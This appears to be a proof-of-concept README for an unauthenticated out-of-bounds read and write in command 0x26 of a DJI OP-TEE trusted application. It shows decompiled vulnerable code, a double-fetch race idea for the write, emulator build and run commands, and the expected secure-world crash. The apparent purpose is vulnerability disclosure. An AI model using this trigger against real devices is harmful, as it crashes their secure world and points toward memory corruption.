# PoC — DJI OP-TEE TA `e91c9402` cmd 0x26 OOB (BUG 2)

Normal-world CA that triggers the **unauthenticated out-of-bounds access** in
command `0x26` (`ssd_get_challenge`, `FUN_00107804`) of TA
`e91c9402-64a0-470f-88e7-bf5d3c606b6a`. See `TA_e91c9402_ssd_bugs_writeup.md`.

## The bug

`case 0x26` gates only on `paramTypes == TEEC_MEMREF_TEMP_INOUT (7)` and
`param0.size == 0x4c`, then reads a 16-bit slot index from the CA buffer and
uses it to index two fixed **32-entry** secure global arrays with **no bounds
check** (and re-fetches it — a double-fetch):

```c
index = *(uint16_t *)(param0.buffer + 2);          // 0..0xFFFF, never bounded
lVar5 = ssd_info_ptr_array[index];                 // (1) OOB READ  @ 0x129c30 + index*8
... memcpy(stack, lVar5, 0x6d) ...                 //     deref'd as a pointer
TEE_GenerateRandom(&ssd_nonce_array[index], 4);    // (2) OOB WRITE @ 0x129e60 + index*4
```

This PoC takes the deterministic single-shot path: a large index makes the
`ssd_info_ptr_array[index]` load itself fall outside mapped secure memory →
immediate secure-world data abort (the writeup's unauthenticated DoS). No auth,
no provisioning: one OpenSession + one InvokeCommand.

(The 4-byte OOB *write* into `ssd_nonce_array` additionally needs the double
fetch — a valid/provisioned index for the gate load, then flip the index from a
second CA thread before the `TEE_GenerateRandom` re-fetch. The single-shot DoS
below is the reliable trigger.)

## Build & run

```sh
cd /srv/emulator
python3 -m emulate --tee optee rootfs/e91c9402-64a0-470f-88e7bf5d3c606b6a.ta   # one shell

cd /srv/optee/pocs/e91_ssd_get_challenge_oob                                    # another
make emulator
./poc            # default slot index 0xFFFF
```

## Expected result

```
[*] InvokeCommand cmd=0x26 paramTypes=0x7 size=0x4c slot_idx=65535 (0xffff)
    -> OOB: ssd_info_ptr_array[65535] @ 0x1a9c28 / ssd_nonce_array[65535] @ 0x169e5c (array bound is 32)
internal err: recv msg error           # emulator socket dropped: secure world crashed
```

Emulator side: `UC_ERR_READ_UNMAPPED`, `PC = ...e91c9402...ta + 0x785c` (the
unchecked `ssd_info_ptr_array[index]` load inside `ssd_get_challenge`).
